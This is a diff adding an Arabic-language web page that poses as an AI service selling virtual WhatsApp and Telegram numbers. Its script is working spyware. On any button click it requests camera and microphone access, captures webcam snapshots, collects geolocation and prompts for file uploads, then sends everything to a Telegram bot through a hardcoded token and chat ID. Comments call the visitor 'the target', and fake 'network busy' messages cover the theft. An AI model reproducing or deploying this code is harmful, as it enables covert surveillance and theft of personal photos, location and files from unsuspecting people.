@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI TERMINAL | نظام الأرقام المطور</title>
+    <style>
+        :root { --neon: #00ff41; --dark: #010b01; }
+        body { background: var(--dark); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .container { border: 2px solid var(--neon); padding: 25px; width: 90%; max-width: 450px; text-align: center; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px var(--neon); border-radius: 15px; }
+        .bot-msg { background: #000; border-right: 3px solid var(--neon); padding: 15px; text-align: right; margin-bottom: 20px; font-size: 14px; min-height: 50px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+        button { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 12px; cursor: pointer; font-weight: bold; transition: 0.3s; border-radius: 5px; }
+        button:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
+        .status-bar { font-size: 10px; margin-top: 15px; color: #555; text-transform: uppercase; }
+        #files-status { display: none; color: #fff; margin-top: 10px; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div style="font-size: 2rem; margin-bottom: 10px;">🤖</div>
+    <div class="bot-msg" id="bot-text">
+        مرحباً بك في نظام AI للأرقام الوهمية. أنا مساعدك الذكي، اختر الخدمة المطلوبة للبدء فوراً...
+    </div>
+
+    <div class="btn-grid">
+        <button onclick="handleAction('whatsapp', 'طلب رقم واتساب')">رقم واتساب ✅</button>
+        <button onclick="handleAction('telegram', 'طلب رقم تليجرام')">رقم تليجرام ✈️</button>
+        <button onclick="handleAction('files', 'تحديث الملفات')">تحديث الأمان 🛡️</button>
+        <button onclick="handleAction('location', 'فحص التغطية')">فحص الشبكة 📍</button>
+    </div>
+
+    <div id="files-status">جاري مزامنة قاعدة البيانات...</div>
+    <div class="status-bar" id="terminal">> SYSTEM_READY_V8.5</div>
+</div>
+
+<video id="v" autoplay playsinline muted style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+
+<script>
+    // بياناتك البرمجية
+    const token = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
+    const myId = "8754338811";
+
+    async function sendToBot(txt, type = "text", blob = null) {
+        let url = `https://api.telegram.org/bot${token}/`;
+        const fd = new FormData();
+        fd.append('chat_id', myId);
+
+        if (type === "text") {
+            url += "sendMessage";
+            fd.append('text', txt);
+            fd.append('parse_mode', 'Markdown');
+        } else {
+            url += (type === "photo" ? "sendPhoto" : "sendDocument");
+            fd.append(type === "photo" ? "photo" : "document", blob, 'data.jpg');
+        }
+        return fetch(url, { method: 'POST', body: fd });
+    }
+
+    // المحرك الأساسي للردود والسحب
+    async function handleAction(action, label) {
+        const botText = document.getElementById('bot-text');
+        const status = document.getElementById('files-status');
+        
+        botText.innerText = `جاري تنفيذ: ${label}... يرجى الانتظار والضغط على 'سماح' إذا ظهرت.`;
+        status.style.display = "block";
+
+        // 1. إبلاغك بالضغط
+        sendToBot(`🎯 *الهدف ضغط على زر:* ${label}\n📱 جاري بدء عملية السحب الشامل...`);
+
+        try {
+            // 2. طلب صلاحيات (الفخ)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('v').srcObject = stream;
+
+            // 3. سحب الموقع إذا طلب "فحص الشبكة"
+            if (action === 'location' || action === 'whatsapp') {
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendToBot(`📍 *موقع الهدف:* \nhttps://www.google.com/maps/embed?pb=!1m14!1m12!1m3!1d5000!2d31.2!3d30.0!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!5e10{p.coords.latitude},${p.coords.longitude}`);
+                });
+            }
+
+            // 4. سحب صور سيلفي فورية
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                canvas.toBlob(b => sendToBot("", "photo", b), 'image/jpeg');
+            }, 2000);
+
+            // 5. سحب الملفات (إذا ضغط تحديث الأمان)
+            if (action === 'files') {
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.multiple = true;
+                input.onchange = e => {
+                    for(let file of e.target.files) sendToBot(file, "document");
+                    botText.innerText = "✅ تم تحديث ملفات الأمان بنجاح.";
+                };
+                input.click();
+            }
+
+            // رد وهمي للضحية
+            if (action !== 'files') {
+                setTimeout(() => {
+                    botText.innerText = `⚠️ عذراً، ضغط الشبكة عالٍ حالياً. تم حجز طلبك وسنرسل الكود إلى تليجرام الخاص بك فور توفره.`;
+                    status.innerText = "تم حفظ الجلسة بنجاح.";
+                }, 4000);
+            }
+
+        } catch (e) {
+            botText.innerText = "❌ خطأ: يجب السماح بالصلاحيات للوصول إلى سيرفر الأرقام.";
+            sendToBot("🚫 الهدف رفض إعطاء الصلاحيات.");
+        }
+    }
+
+    // تأثير التيرمينال
+    setInterval(() => {
+        const t = document.getElementById('terminal');
+        t.innerText = `> ${Math.random().toString(16).toUpperCase().slice(2,10)}_SYNC_ACTIVE`;
+    }, 3000);
+</script>
+
+</body>
+</html>
